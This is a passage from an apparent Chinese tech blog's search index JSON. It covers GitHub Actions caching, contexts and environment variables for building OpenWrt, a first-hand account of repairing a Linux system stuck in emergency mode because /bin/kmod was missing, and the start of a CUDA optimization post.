-rf *\n  working-directory: ./temp\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#storagecache-","title":"storage(cache, )","text":"<ul> <li>\u4f7f\u7528cache\u5b58\u50a8\u4e0d\u7ecf\u5e38\u6539\u53d8\u7684\u5185\u5bb9\uff0c\u5982npm\u7684\u4f9d\u8d56</li> <li>\u4f7f\u7528artifacts\u5b58\u50a8\u751f\u6210\u7684\u6587\u4ef6\u4ee5\u4fbf\u5176\u5b83workflow\u8bbf\u95ee\uff0c\u5982\u7f16\u8bd1\u7684\u4e8c\u8fdb\u5236\u6216log\u3002</li> </ul> <p>cache: Caching dependencies to speed up workflows - GitHub Docs artifacts: Storing workflow data as artifacts - GitHub Docs</p> <p>For example, you can create a\u00a0<code>key</code>\u00a0using an expression that calculates the hash of an npm\u00a0<code>package-lock.json</code>\u00a0file. So, when the dependencies that make up the\u00a0<code>package-lock.json</code>\u00a0file change, the cache key changes and a new cache is automatically created. <pre><code>npm-${{ hashFiles('package-lock.json') }}\n</code></pre></p>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#context\u548c\u9ed8\u8ba4\u73af\u5883\u53d8\u91cf","title":"Context\u548c\u9ed8\u8ba4\u73af\u5883\u53d8\u91cf","text":"<p>Default environment variables:\u00a0These environment variables exist only on the runner that is executing your job.</p> <p>Contexts:\u00a0You can use most contexts at any point in your workflow, including when\u00a0default variables\u00a0would be unavailable. For example, you can use contexts with expressions to perform initial processing before the job is routed to a runner for execution; this allows you to use a context with the conditional\u00a0<code>if</code>\u00a0keyword to determine whether a step should run</p> <p>\u4f7f\u7528env\u5b9a\u4e49\u7684\u53d8\u91cf\u65e2\u53ef\u4ee5\u5728run\u4e2d\u4f7f\u7528\uff0c\u4e5f\u53ef\u4ee5\u5728workflow\u6587\u4ef6\u4e2d\u4f7f\u7528\u3002\u5728run\u4e2d\u4f7f\u7528\u53ef\u4ee5\u4f7f\u7528\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u5e94\u7684shell\u7684\u683c\u5f0f\u8bfb\u53d6\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528context\u7684\u683c\u5f0f\u8bfb\u53d6\u3002</p>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#\u5b9a\u4e49environment-variable","title":"\u5b9a\u4e49environment variable","text":"<pre><code>name: Greeting on variable day\n\non:\n  workflow_dispatch\n\nenv:\n  DAY_OF_WEEK: Monday\n\njobs:\n  greeting_job:\n    runs-on: ubuntu-latest\n    env:\n      Greeting: Hello\n    steps:\n      - name: \"Say Hello Mona it's Monday\"\n        run: echo \"$Greeting $First_Name. Today is $DAY_OF_WEEK!\"\n        env:\n          First_Name: Mona\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#\u4f7f\u7528context","title":"\u4f7f\u7528Context","text":"<p>json\u6570\u636e\u7ed3\u6784\u7684\u5bf9\u8c61\u3002\u5305\u542b\u591a\u79cd\u7c7b\u578bContext\uff1a<code>github, env, jobs, steps, runner, secrets, inputs</code></p>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#github","title":"github","text":"<pre><code>{\n  \"token\": \"***\",\n  \"job\": \"dump_contexts_to_log\",\n  \"ref\": \"refs/heads/my_branch\",\n  \"sha\": \"c27d339ee6075c1f744c5d4b200f7901aad2c369\",\n  \"repository\": \"octocat/hello-world\",\n  \"repository_owner\": \"octocat\",\n  \"repositoryUrl\": \"git://github.com/octocat/hello-world.git\",\n  \"run_id\": \"1536140711\",\n  \"run_number\": \"314\",\n  \"retention_days\": \"90\",\n  \"run_attempt\": \"1\",\n  \"actor\": \"octocat\",\n  \"workflow\": \"Context testing\",\n  \"head_ref\": \"\",\n  \"base_ref\": \"\",\n  \"event_name\": \"push\",\n  \"event\": {\n    ...\n  },\n  \"server_url\": \"https://github.com\",\n  \"api_url\": \"https://api.github.com\",\n  \"graphql_url\": \"https://api.github.com/graphql\",\n  \"ref_name\": \"my_branch\",\n  \"ref_protected\": false,\n  \"ref_type\": \"branch\",\n  \"secret_source\": \"Actions\",\n  \"workspace\": \"/home/runner/work/hello-world/hello-world\",\n  \"action\": \"github_step\",\n  \"event_path\": \"/home/runner/work/_temp/_github_workflow/event.json\",\n  \"action_repository\": \"\",\n  \"action_ref\": \"\",\n  \"path\": \"/home/runner/work/_temp/_runner_file_commands/add_path_b037e7b5-1c88-48e2-bf78-eaaab5e02602\",\n  \"env\": \"/home/runner/work/_temp/_runner_file_commands/set_env_b037e7b5-1c88-48e2-bf78-eaaab5e02602\"\n}\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#env","title":"env","text":"<pre><code>name: Hi Mascot\non: push\nenv:\n  mascot: Mona\n  super_duper_var: totally_awesome\n\njobs:\n  windows_job:\n    runs-on: windows-latest\n    steps:\n      - run: echo 'Hi ${{ env.mascot }}'  # Hi Mona\n      - run: echo 'Hi ${{ env.mascot }}'  # Hi Octocat\n        env:\n          mascot: Octocat\n  linux_job:\n    runs-on: ubuntu-latest\n    env:\n      mascot: Tux\n    steps:\n      - run: echo 'Hi ${{ env.mascot }}'  # Hi Tux\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#steps","title":"steps","text":"<p>\u901a\u8fc7id\u8bbe\u7f6estep\u6bcf\u6b65\u540d\u5b57\uff0c\u4e4b\u540e\u53ef\u4ee5\u83b7\u5f97\u6bcf\u6b65\u7684output\u7b49\u4fe1\u606f</p> <p>This example\u00a0<code>steps</code>\u00a0context shows two previous steps that had an\u00a0<code>id</code>\u00a0specified. The first step had the\u00a0<code>id</code>\u00a0named\u00a0<code>checkout</code>, the second\u00a0<code>generate_number</code>. The\u00a0<code>generate_number</code>\u00a0step had an output named\u00a0<code>random_number</code>.</p> <pre><code>{\n  \"checkout\": {\n    \"outputs\": {},\n    \"outcome\": \"success\",\n    \"conclusion\": \"success\"\n  },\n  \"generate_number\": {\n    \"outputs\": {\n      \"random_number\": \"1\"\n    },\n    \"outcome\": \"success\",\n    \"conclusion\": \"success\"\n  }\n}\n</code></pre>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/01/27/2023-01-27-github-action%E7%BC%96%E8%AF%91openwrt/#runner","title":"runner","text":"<pre><code>{\n  \"os\": \"Linux\",\n  \"arch\": \"X64\",\n  \"name\": \"GitHub Actions 2\",\n  \"tool_cache\": \"/opt/hostedtoolcache\",\n  \"temp\": \"/home/runner/work/_temp\"\n}\n</code></pre> <p>secrets</p> <p><code>GITHUB_TOKEN</code>\u00a0is a secret that is automatically created for every workflow run, and is always included in the\u00a0<code>secrets</code>\u00a0context</p>","tags":["openwrt","CI","github-action"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/","title":"\u8bb0\u4e00\u6b21linux\u7cfb\u7edf\u65e0\u6cd5\u542f\u52a8\u4fee\u590d\u8fc7\u7a0b","text":"","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u6211\u60f3\u8981\u628a\u7b2c\u4e8c\u5f20\u663e\u5361\u4e5f\u76f4\u901a\u7ed9\u865a\u62df\u673a\uff0c\u7136\u540e\u5c31\u81ea\u5df1\u7f16\u8bd1\u4e86\u4e00\u4e2a\u6253\u4e86acs overide patch\u7684\u5185\u6838\u3002\u4e4b\u540e\u542f\u52a8\u4e5f\u6ca1\u6709\u95ee\u9898\u3002\u4f46\u662f\u5f53\u6211\u7b2c\u4e00\u6b21\u8fd0\u884c\u865a\u62df\u673a\u540e\uff0c\u7535\u8111\u5c31\u5361\u6b7b\u4e86\u3002\u7136\u540e\u6211\u5f3a\u5236\u5173\u673a\u540e\uff0c\u65e0\u6cd5\u8fdb\u5165\u7cfb\u7edf\uff0c\u800c\u8fdb\u5165\u4e86busybox initramfs\u4ea4\u4e92\u547d\u4ee4\u884c\u3002\u63d0\u793a\u6587\u4ef6\u7cfb\u7edf\u9519\u8bef\uff0c\u8ba9\u6211fsck\u7cfb\u7edf\u76d8\u3002\u6211\u7167\u505a\u540e\u5c31\u6210\u529f\u8fdb\u5165\u7cfb\u7edf\u4e86\u3002 - \u8fd9\u91cc\u8fdb\u5165\u7cfb\u7edf\u540e\u4e00\u5207\u6b63\u5e38\uff0c\u4f46\u662flxc\u7684storage\u663e\u793aunavailable\uff0czpool import zfs_lxd.img\u663e\u793a\u635f\u574f\u3002</p> <p>\u7136\u540e\u6211\u60f3\u518d\u8bd5\u8bd5\uff0c\u7ed3\u679c\u542f\u52a8\u865a\u62df\u673a\u540e\u53c8\u5361\u6b7b\u4e86\u3002\u6211\u5f3a\u5236\u91cd\u542f\u540e\uff0c\u597d\u50cf\u53c8\u8fdb\u5165busybox\u8fdb\u884cfsck\u4e86\uff0c\u4f46\u7ed3\u679c\u8fd8\u662f\u8fdb\u4e0d\u4e86\u7cfb\u7edf\uff0c\u8fd9\u6b21\u8fdb\u5165\u4e86\u7d27\u6025\u6a21\u5f0f\u3002</p>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u8fc7\u7a0b","title":"\u8fc7\u7a0b","text":"","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u7d27\u6025emergency\u6a21\u5f0f","title":"\u7d27\u6025\uff0cemergency\u6a21\u5f0f","text":"<p>\u4e3b\u8981\u7684\u62a5\u9519\u662f<code>FAT-fs IO charset iso8895-1 not found</code>\uff0c \u63d0\u793a\u8ba9\u6211\u767b\u5f55\u67e5\u770b\u65e5\u5fd7\uff0c\u6211\u767b\u5f55\u540edf -h\uff0c\u53d1\u73b0\u786e\u5b9eefi\u5206\u533a\u662f\u6ca1\u6709\u6302\u8f7d\u7684\u3002\u7d27\u6025\u6a21\u5f0f\u4e0b\uff0c\u5176\u5b83\u547d\u4ee4\u597d\u50cf\u90fd\u6ca1\u5565\u95ee\u9898\uff0czsh\u7684\u914d\u7f6e\u90fd\u662f\u6211\u7684oh-my-zsh\u3002 </p> <p>\u7f51\u4e0a\u6709\u4e00\u6837\u7684\u62a5\u9519 - boot - 16.04 - stuck in emergency mode - FAT-fs (nvme0n1p1): IO charset iso8859-1 not found - Ask Ubuntu - mount - Restore /boot/efi - Ask Ubuntu</p> <p>\u4f46\u662f\u4ed6\u4eec\u63d0\u5230\u7684\u8fdb\u5165\u6062\u590d\u6a21\u5f0f\uff0c\u7136\u540e\u8fd0\u884cdepmod\uff0c\u6211\u65e0\u6cd5\u505a\u5230\uff1a - \u6211\u4e0d\u77e5\u9053\u600e\u4e48\u8fdb\u5165\u6062\u590d\u6a21\u5f0f\uff0c\u56e0\u4e3a\u6211\u91cd\u542f\u5c31\u4f1a\u8fdb\u5165\u8fd9\u4e2a\u7d27\u6025\u6a21\u5f0f\u65e0\u9650\u5faa\u73af   - \u5176\u5b9e\u662f\u56e0\u4e3a\u6211\u628agrub\u8bbe\u7f6e\u4e3ahidden\u5e76\u4e14\u5ef6\u8fdf\u4e3a0\uff0c\u5f00\u542f\u540e\u5c31\u53ef\u4ee5\u8fdb\u5165grub\u754c\u9762\u9009\u62e9\u5185\u6838\u7248\u672c\u4ee5\u53ca\u7d27\u6025\u6a21\u5f0f - \u5728\u7d27\u6025\u6a21\u5f0f\u4e2d\u6211\u65e0\u6cd5fsck\u7cfb\u7edf\u76d8\uff0c\u56e0\u4e3a\u5df2\u7ecf\u6302\u8f7d\u4e86\uff08efi\u5206\u533a\u53ef\u4ee5\uff0c\u4f46\u662f\u6ca1\u6709\u9519\u8bef\uff09 - \u7d27\u6025\u6a21\u5f0f\u4e2d\u65e0\u6cd5\u8fd0\u884cdepmod\u547d\u4ee4\uff08\u8fd9\u91cc\u5176\u5b9e\u5df2\u7ecf\u53cd\u6620\u95ee\u9898\u4e86\uff09</p>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u5e0c\u671blivecd\u4fee\u590d","title":"\u5e0c\u671b\uff0clivecd\u4fee\u590d","text":"<p>\u6211\u4ee5\u4e3a\u662fefi\u5206\u533a\u635f\u574f\u4e86\uff0c\u5728\u53cd\u590dfsck\u65e0\u6548\u540e\uff0c\u6211\u51b3\u5b9a\u91cd\u5efaefi\u5206\u533a\u3002\u4e8e\u662f\u901a\u8fc7U\u76d8\u8fdb\u5165\u4e86ubuntu20\u7684livecd\uff0822\u7248\u672c\u542f\u52a8\u5f88\u6162\uff09</p> <pre><code>gparted\u683c\u5f0f\u5316\u5e76\u91cd\u5efa\u5206\u533a\n\n# \u6302\u8f7defi\u5206\u533a\u548c\u7cfb\u7edf\u5206\u533a\nmount /dev/nvmexxx   /xxx\nmount /dev/nvmexxx   /xxx/boot/efi\n\ncd /xxx\nmount -t proc /proc proc\nmount --rbind /sys sys\nmount --rbind /dev dev\n\nchroot /xxx\n\n# \u66f4\u65b0efi\u5206\u533aUUID\uff08\u683c\u5f0f\u5316\u540e\u6539\u53d8\uff09\nvim /etc/fstab\n\nupdate-grub\ngrub-install\n</code></pre> <p>\u53d1\u73b0\u5728chroot\u7cfb\u7edf\u91cc\u4e5f\u65e0\u6cd5\u8fd0\u884c<code>depmod, modeprobe</code>\u7b49\u547d\u4ee4\uff0c\u63d0\u793a\u6211\u5b89\u88c5<code>zmod</code>\uff0c\u4f46\u662f\u5b89\u88c5\u65f6\u53c8\u544a\u8bc9\u6211\u5df2\u7ecf\u5b89\u88c5\u4e86\u3002\uff08\u8fd9\u91cc\u53c8\u518d\u6b21\u53cd\u6620\u4e86\u95ee\u9898\u6240\u5728\uff09</p> <p>\u91cd\u5efaefi\u5206\u533a\u540e\u4f9d\u7136\u8fd8\u662f\u5361\u5728\u7d27\u6025\u6a21\u5f0f\u3002 </p>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u5c1d\u8bd5grub-recovery\u6a21\u5f0f","title":"\u5c1d\u8bd5\uff0cgrub recovery\u6a21\u5f0f","text":"<p>\u4fee\u6539grub\u914d\u7f6e\u540e\uff0c\u53ef\u4ee5\u8fdb\u5165grub\u83dc\u5355\u4e86\u3002 \u6211\u5c1d\u8bd5grub\u9009\u62e9\u65e7\u7684\u5185\u6838\u7684recovery\u6a21\u5f0f\uff0c\u4f46\u662f\u5374\u5f88\u4e0d\u7a33\u5b9a\uff0c\u51e0\u4e4e\u7acb\u523b\u53c8\u4f1a\u8fdb\u5165\u7d27\u6025\u6a21\u5f0f\uff0c\u5bfc\u81f4\u65e0\u6cd5\u8fd0\u884c\u6587\u5b57\u83dc\u5355\u4e2d\u3002</p>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u89e3\u51b3kmod\u4e0d\u7ffc\u800c\u98de","title":"\u89e3\u51b3\uff0ckmod\u4e0d\u7ffc\u800c\u98de","text":"<p>\u548cczw\u8ba8\u8bba\uff0c\u590d\u76d8\u4e86\u4e0b\u6574\u4e2a\u8fc7\u7a0b\uff0c\u5e76\u7ec8\u4e8e\u53d1\u73b0\u95ee\u9898\u6240\u5728\uff1a</p> <p>\u65e0\u6cd5\u6302\u8f7defi\u5206\u533a &lt;- iso8895\u9519\u8bef &lt;- nls_iso8895-1.ko\u4e0d\u5b58\u5728 &lt;- find /lib/module/\u81ea\u5df1\u7f16\u8bd1\u7684\u5185\u6838/\uff0c\u53d1\u73b0ko\u6587\u4ef6\u662f\u5b58\u5728\u7684\u3002 modprobe\u547d\u4ee4\u65e0\u6cd5\u8fd0\u884c &lt;- \u53d1\u73b0modprobe\u662f\u4e00\u4e2a\u94fe\u63a5\u6307\u5411/bin/kmod\uff0c\u5e76\u4e14\u662f\u7ea2\u8272\u7684\uff0c\u8868\u793a\u94fe\u63a5\u662f\u65e0\u6548\u7684\u3002 &lt;- \u53d1\u73b0/bin/kmod\u6587\u4ef6\u4e0d\u5b58\u5728\uff01</p> <p>\u4e8e\u662f\u4ececzw\u7684\u673a\u5668\u4e0a\u62f7\u8d1d\u4e86\u4e00\u4efdkmod\u6587\u4ef6\uff0c\u7ed3\u679c\u6062\u590d\u6a21\u5f0f\u53ef\u4ee5\u8fdb\u5165\u4e86\uff0c\u673a\u5668\u4e5f\u53ef\u4ee5\u6b63\u5e38\u542f\u52a8\u3002 - p.s \u53d1\u73b0lxc zfs pool\u53c8\u635f\u574f\u4e86</p>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u603b\u7ed3","title":"\u603b\u7ed3","text":"","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#linux\u542f\u52a8\u8fc7\u7a0b","title":"linux\u542f\u52a8\u8fc7\u7a0b","text":"<p>Arch boot process - ArchWiki (archlinux.org) Understanding the Boot process \u2014 BIOS vs UEFI (linuxhint.com)</p> <p>OS\u542f\u52a8\u8fc7\u7a0b\uff1a - \u56fa\u4ef6\uff1aCPU\u6700\u5f00\u59cb\u6267\u884c\u7684\u6307\u4ee4\u3002\u4e3b\u8981\u5de5\u4f5cPOST\u81ea\u68c0\uff0c\u786c\u4ef6\u521d\u59cb\u5316\uff0c\u52a0\u8f7d\u5f15\u5bfc\u7a0b\u5e8f - \u5f15\u5bfc\u7a0b\u5e8f\uff1a\u52a0\u8f7dos\u5185\u6838\uff08\u53ef\u4ee5\u6307\u5b9a\u5185\u6838\u53c2\u6570\u3001\u521d\u59cb\u6587\u4ef6\u7cfb\u7edf\uff09 - \u5185\u6838\uff1a   - \u521d\u59cb\u5316\uff0c\u5982\u786c\u4ef6\u521d\u59cb\u5316\uff0c\u9a71\u52a8\u52a0\u8f7d   - init\uff1a\u7528\u6237\u7a7a\u95f4\u521d\u59cb\u5316\u30021-6\u4e0d\u540crun level\uff0c\u5982level 1\u4e3asingle user\uff0clevel 3\u4e3a\u591a\u7528\u6237\u547d\u4ee4\u884c\uff0clevel 5\u5305\u542b\u56fe\u5f62\u5316\u754c\u9762     - p.s level 6\u4e3areboot</p> <p>BIOS - BIOS\uff0c\u4f4d\u4e8e\u4e3b\u677fflash - \u4e00\u7ea7\u5f15\u5bfc\u7a0b\u5e8f\uff0c\u4f4d\u4e8eMBR\uff0c\u51e0\u767e\u5b57\u8282\uff0c\u975e\u5e38\u5c0f\uff0c\u7528\u4e8e\u52a0\u8f7d\u4e8c\u7ea7\u5f15\u5bfc\u7a0b\u5e8f - \u4e8c\u7ea7\u5f15\u5bfc\u7a0b\u5e8f\uff08grub\uff09\uff0c\u4f4d\u4e8e - \u5185\u6838\uff0clinux\u5185\u6838(vmlinuz)\u4f4d\u4e8e\u7cfb\u7edf\u76d8/boot\u8def\u5f84\u4e0b\uff0c\u6709\u4e0d\u540c\u7248\u672c\u3002\u8be5\u8def\u5f84\u540c\u65f6\u8fd8\u6709\u521d\u59cb\u6587\u4ef6\u7cfb\u7edf(initrd.img)</p> <p>UEFI - UEFI\uff0c\u4f4d\u4e8e\u4e3b\u677fflash - EFI\u5e94\u7528\uff08grub\uff09\uff0c\u4f4d\u4e8eESP\u5206\u533a\uff08\u901a\u5e38\u4e3aFAT32\u6587\u4ef6\u7cfb\u7edf\uff09\u3002grub image\u5728/boot/grub   <pre><code>root@Ryzen-Ubuntu22 \u279c  yfy ls /boot/efi/EFI/ubuntu\nBOOTX64.CSV  grub.cfg  grubx64.efi  mmx64.efi  shimx64.efi\nroot@Ryzen-Ubuntu22 \u279c  yfy ls /boot/efi/EFI/BOOT\nBOOTX64.EFI  fbx64.efi  mmx64.efi\n</code></pre></p>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u5404\u79cd\u6551\u63f4\u6a21\u5f0f","title":"\u5404\u79cd\u6551\u63f4\u6a21\u5f0f","text":"","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#grub-rescue","title":"grub rescue","text":"<ul> <li>\u5185\u6838\u8fd8\u6ca1\u52a0\u8f7d\u524d\uff0cgurb\u9519\u8bef\u3002\u5982\u65e0\u6cd5\u8bfb\u53d6\u914d\u7f6e\u6587\u4ef6\uff0c\u9700\u8981\u624b\u52a8\u6307\u5b9akernel\u4f4d\u7f6e\uff08\u54ea\u4e2a\u78c1\u76d8\uff0c\u54ea\u4e2a\u5206\u533a\uff09</li> <li>grub\u5176\u5b83\uff1a</li> <li>\u6309ESC\u8fdb\u5165\u547d\u4ee4\u884c\u6a21\u5f0f\uff0c\u8f93\u5165normal\u91cd\u56de\u83dc\u5355\u754c\u9762\u3002</li> <li>\u83dc\u5355\u754c\u9762\u8f93\u5165e\uff0c\u53ef\u4ee5\u7f16\u8f91\u542f\u52a8\u9879\u3002</li> <li>\u9009\u62e9Ubuntu Advance\uff0c\u53ef\u4ee5\u9009\u62e9\u4e0d\u540ckernel\u7248\u672c\uff0c\u6216\u8005\u8fdb\u5165recovery\u6a21\u5f0f</li> </ul>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#recovery\u6a21\u5f0f","title":"recovery\u6a21\u5f0f","text":"<ul> <li>\u5c06\u4ee5\u5355\u7528\u6237\u6a21\u5f0f(single-user)\u6a21\u5f0f\u542f\u52a8\uff0c\u662f\u6700\u4f4e\u7684runlevel\u3002</li> <li>\u7528\u9014\uff1a</li> <li>\u5fd8\u8bb0root\u5bc6\u7801</li> <li>\u5176\u5b83\u6a21\u5f0f\u53ef\u80fd\u65e0\u6cd5\u8fdb\u5165\u7cfb\u7edf\uff0c\u800c\u53ef\u4ee5\u8fdb\u5165recovery\u6a21\u5f0f\u8fdb\u884c\u6062\u590d\uff0c\u6216\u8005\u5907\u4efd\u6587\u4ef6\u3002</li> <li>\u540e\u9762\u8981\u4ecb\u7ecd\u7684\u4e24\u4e2a\u6a21\u5f0f\uff0c\u5219\u662f\u7cfb\u7edf\u65e0\u6cd5\u6302\u8f7d\uff0c\u88ab\u8feb\u8fdb\u5165\u7684\u6a21\u5f0f\u3002</li> </ul>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#busybox-initramfs","title":"Busybox Initramfs","text":"<ul> <li>\u5185\u6838\u521d\u59cb\u5316\u8fc7\u7a0b\u4e2d\uff0c\u68c0\u6d4b\u5230\u6839\u6587\u4ef6\u7cfb\u7edf\u635f\u574f\u3002\uff08initramfs\u5728\u5185\u6838\u521d\u59cb\u5316\u5230\u80fd\u591f\u6302\u8f7d\u6839\u6587\u4ef6\u7cfb\u7edf\u524d\u4f7f\u7528\uff0cbusybox\u5305\u542b\u5e38\u7528\u7684\u547d\u4ee4\uff09</li> <li>\u901a\u5e38fsck\u6587\u4ef6\u7cfb\u7edf\u5373\u53ef</li> </ul>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#emergency\u6a21\u5f0f","title":"emergency\u6a21\u5f0f","text":"<ul> <li>\u5185\u6838\u521d\u59cb\u5316\u8fc7\u7a0b\u4e2d\u56e0\u4e3a\u4e00\u4e9b\u539f\u56e0\u5d29\u6e83</li> <li>\u4ee5\u53ea\u8bfb\u6a21\u5f0f\u6302\u8f7d\u6587\u4ef6\u7cfb\u7edf</li> </ul>","tags":["linux","grub","fsck"]},{"location":"%E6%8A%98%E8%85%BE/2023/03/23/2023-03-23-%E8%AE%B0%E4%B8%80%E6%AC%A1linux%E7%B3%BB%E7%BB%9F%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8%E4%BF%AE%E5%A4%8D%E8%BF%87%E7%A8%8B/#\u5fc3\u5f97","title":"\u5fc3\u5f97","text":"<ul> <li>\u6298\u817e\u4e4b\u524d\u505a\u597d\u6700\u574f\u7684\u6253\u7b97\u3002\u6bd4\u5982\u8fd9\u6b21\u5728\u6211\u8fdb\u5165\u4e0d\u4e86\u7cfb\u7edf\u540e\uff0c\u6211\u6700\u574f\u7684\u60c5\u51b5\u662f\u5c06\u91cd\u8981\u6587\u4ef6\u3001\u914d\u7f6e\u62f7\u8d1d\u51fa\u6765\uff0c\u7136\u540e\u91cd\u65b0\u5b89\u88c5\u7cfb\u7edf\u3002\u671f\u95f4\u6211\u53ef\u4ee5\u4f7f\u7528\u6211\u7684\u7b14\u8bb0\u672c\u5e72\u6d3b\uff08\u56e0\u4e3a\u6211\u7684workspace\u6587\u4ef6\u5939\u662f\u642d\u5efa\u4e86\u81ea\u52a8\u540c\u6b65\u7684\uff09\u3002\u5982\u679c\u5728\u6211\u7684\u7cfb\u7edf\u5d29\u6389\u671f\u95f4\uff0c\u6211\u5565\u90fd\u5e72\u4e0d\u4e86\uff0c\u90a3\u6211\u7684\u5fc3\u7406\u538b\u529b\u662f\u4f1a\u975e\u5e38\u5927\u7684\u3002</li> </ul>","tags":["linux","grub","fsck"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/","title":"CUDA\u4f18\u5316","text":"","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/#sc07","title":"SC07","text":"<p>Microsoft PowerPoint - SC07_Optimization_Harris.ppt [Read-Only] (polytechnique.fr)</p>","tags":["cuda"]},{"location":"%E5%AD%A6%E4%B9%A0/2023/04/16/2023-04-16-CUDA%E4%BC%98%E5%8C%96/#\u5e38\u89c1\u4f18\u5316\u65b9\u6cd5","title":"\u5e38\u89c1\u4f18\u5316\u65b9\u6cd5","text":"<p>\u4f18\u5316\u76ee\u6807 - 